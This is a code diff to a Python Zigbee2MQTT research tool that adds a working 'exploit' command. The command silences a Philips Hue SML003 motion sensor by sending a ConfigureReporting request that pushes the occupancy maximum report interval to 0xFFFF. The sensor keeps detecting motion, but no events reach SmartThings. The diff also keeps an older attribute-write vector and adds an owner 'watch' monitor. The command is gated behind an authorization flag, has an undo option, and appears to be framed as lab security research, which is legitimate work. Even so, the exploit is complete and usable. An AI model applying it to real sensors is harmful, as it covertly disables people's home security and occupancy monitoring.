@@ -125,6 +125,11 @@ def log(msg: str) -> None:
     print(f"[AO] {msg}", flush=True)
 
 
+def tlog(msg: str) -> None:
+    """Timestamped log line — used by the owner `watch` stream."""
+    print(f"[AO {time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}", flush=True)
+
+
 # ── MQTT / Zigbee2MQTT client wrapper ─────────────────────────────────────────────
 
 @dataclass
@@ -510,13 +515,82 @@ def cmd_diff(args) -> int:
     return 0
 
 
-def cmd_exploit(args) -> int:
-    """GATED: OTA-write the hidden pirOToUDelay attribute (max hold) to neutralize the sensor.
+# Primary exploit vector: disable occupancy reporting via ZCL ConfigureReporting.
+# max_report_interval = 0xFFFF => the device stops issuing occupancy reports to the coordinator.
+REPORTING_TARGET = {
+    "cluster": "msOccupancySensing",   # 0x0406
+    "attribute": "occupancy",          # 0x0000
+    "endpoint": 2,                     # Hue SML003 hosts the sensor clusters on endpoint 2
+    "disable": {"minimum_report_interval": 0, "maximum_report_interval": 0xFFFF, "reportable_change": 0},
+    "restore": {"minimum_report_interval": 0, "maximum_report_interval": 3600, "reportable_change": 0},
+}
 
-    The write payload is fully formed below but is only SENT with --i-have-authorization,
-    and only against the author's own isolated lab device. Verify physically by walk-test
-    and confirm no event surfaces on the platform.
+
+def cmd_exploit(args) -> int:
+    """GATED: neutralize the sensor over the air (author's own isolated lab device only).
+
+    PRIMARY vector (confirmed on Hue SML003 fw 2.53.6): ConfigureReporting on
+    msOccupancySensing.occupancy with maximum_report_interval = 0xFFFF, which tells the device to
+    stop issuing occupancy reports to the coordinator — it keeps detecting but goes silent, and raw
+    reporting config is invisible to the SmartThings edge driver. `--undo` restores stock reporting.
+
+    LEGACY vector (`--legacy-attr-write`): the pirOToUDelay attribute write. Kept for the record;
+    the device accepts it but it is behaviorally INERT on this firmware.
     """
+    if args.legacy_attr_write:
+        return _exploit_attr_write(args)
+
+    restore = args.undo
+    cfg = REPORTING_TARGET["restore"] if restore else REPORTING_TARGET["disable"]
+    label = "RESTORE" if restore else "DISABLE (neutralize)"
+    preview = {"cluster": REPORTING_TARGET["cluster"],
+               "attribute": REPORTING_TARGET["attribute"],
+               "endpoint": REPORTING_TARGET["endpoint"], **cfg}
+    log(f"exploit vector: {label} occupancy reporting via ConfigureReporting")
+    log(f"  request topic: {args.base_topic}/bridge/request/device/configure_reporting")
+    log(f"  payload (id added at send): {json.dumps(preview)}")
+    if not args.i_have_authorization:
+        log("DRY RUN — not sent. Re-run with --i-have-authorization on YOUR OWN device, "
+            "keeping the sensor awake (motion) so the command lands.")
+        return 0
+
+    z2m = Z2MClient(args.broker, args.port, args.base_topic)
+    z2m.connect()
+    try:
+        target = find_target(z2m.wait_devices(), args.device)
+        if target is None:
+            log("victim device not found; refusing to act.")
+            return 2
+        name = target["friendly_name"]
+        req = {"id": name, **preview}
+        log(f"{'restoring' if restore else 'disabling'} occupancy reporting on {name} ...")
+        z2m.drain()
+        z2m.publish(z2m.t("bridge", "request", "device", "configure_reporting"), req)
+        resps = z2m.collect("bridge/response/device/configure_reporting",
+                            timeout=max(args.dwell, 25.0))
+        ok = next((r for r in resps if isinstance(r, dict) and r.get("status") == "ok"), None)
+        if ok is not None:
+            log(f"configure_reporting OK: {json.dumps(ok.get('data', ok))}")
+            if restore:
+                log("occupancy reporting restored (min 0 / max 3600).")
+            else:
+                log("NEUTRALIZED: occupancy reporting disabled. Walk-test — occupancy will freeze; "
+                    "run `watch` to capture it. Re-enable: exploit --undo --i-have-authorization")
+            return 0
+        err = next((r for r in resps if isinstance(r, dict) and r.get("status") == "error"), None)
+        if err is not None:
+            log(f"configure_reporting FAILED: {err.get('error', err)}")
+            return 1
+        log("no configure_reporting response within the wait window — the sleepy sensor may "
+            "not have woken in time. The request is queued and often still lands a few seconds "
+            "later; confirm with `watch` or the Z2M log before assuming failure.")
+        return 1
+    finally:
+        z2m.disconnect()
+
+
+def _exploit_attr_write(args) -> int:
+    """LEGACY/record: OTA-write pirOToUDelay (max hold). Accepted but behaviorally INERT on SML003."""
     tgt = EXPLOIT_TARGET
     write_body: dict[str, Any] = {
         "cluster": tgt["cluster"],
@@ -530,7 +604,7 @@ def cmd_exploit(args) -> int:
     if tgt.get("manufacturer_code") is not None:
         write_body["options"] = {"manufacturerCode": tgt["manufacturer_code"]}
     payload = {"write": write_body}
-    log("exploit target (neutralization write):")
+    log("legacy attribute-write vector (documented as behaviorally INERT on SML003):")
     log(json.dumps(payload, indent=2))
     if not args.i_have_authorization:
         log("DRY RUN — not sent. Re-run with --i-have-authorization to write to YOUR OWN device.")
@@ -544,10 +618,10 @@ def cmd_exploit(args) -> int:
         if target is None:
             log("victim device not found; refusing to write.")
             return 2
-        log(f"writing hidden attribute to {target['friendly_name']} ...")
+        log(f"writing attribute to {target['friendly_name']} ...")
         z2m.publish(z2m.t(target["friendly_name"], "set"), payload)
         time.sleep(args.dwell)
-        log("write sent. Walk-test the sensor and confirm no event appears on SmartThings.")
+        log("write sent (inert on this firmware). Walk-test to confirm no behavioral change.")
         return 0
     finally:
         z2m.disconnect()
@@ -560,7 +634,7 @@ def cmd_watch(args) -> int:
     try:
         devices = z2m.wait_devices()
         names = {d.get("friendly_name") for d in devices if isinstance(d, dict)}
-        log(f"watching {len(names)} device(s) for setting changes. Ctrl-C to stop.")
+        tlog(f"watching {len(names)} device(s) for setting changes. Ctrl-C to stop.")
         last: dict[str, dict] = {}
         while True:
             try:
@@ -575,12 +649,12 @@ def cmd_watch(args) -> int:
                 if k in ("last_seen", "linkquality"):
                     continue
                 if k not in prev:
-                    log(f"[{suffix}] first-seen {k} = {v!r}")
+                    tlog(f"[{suffix}] first-seen {k} = {v!r}")
                 elif prev[k] != v:
-                    log(f"[{suffix}] CHANGE {k}: {prev[k]!r} -> {v!r}")
+                    tlog(f"[{suffix}] CHANGE {k}: {prev[k]!r} -> {v!r}")
             last[suffix] = {**prev, **payload}
     except KeyboardInterrupt:
-        log("stopped.")
+        tlog("stopped.")
         return 0
     finally:
         z2m.disconnect()
@@ -647,9 +721,13 @@ def build_parser() -> argparse.ArgumentParser:
     d.add_argument("--out", default="../../4_analysis_output/attribute-oracle/hidden_attributes_report.json")
     d.set_defaults(func=cmd_diff)
 
-    x = sub.add_parser("exploit", help="OTA-write a hidden attribute to neutralize the sensor (gated)")
+    x = sub.add_parser("exploit", help="neutralize the sensor by disabling occupancy reporting (gated)")
     x.add_argument("--i-have-authorization", action="store_true",
-                   help="actually send the write; use ONLY on your own isolated lab device")
+                   help="actually send the command; use ONLY on your own isolated lab device")
+    x.add_argument("--undo", action="store_true",
+                   help="restore occupancy reporting (min 0 / max 3600) instead of disabling it")
+    x.add_argument("--legacy-attr-write", action="store_true",
+                   help="use the documented-inert pirOToUDelay attribute write instead of reporting-config")
     x.set_defaults(func=cmd_exploit)
 
     sub.add_parser("watch", help="owner tool: notify on any device setting change").set_defaults(func=cmd_watch)
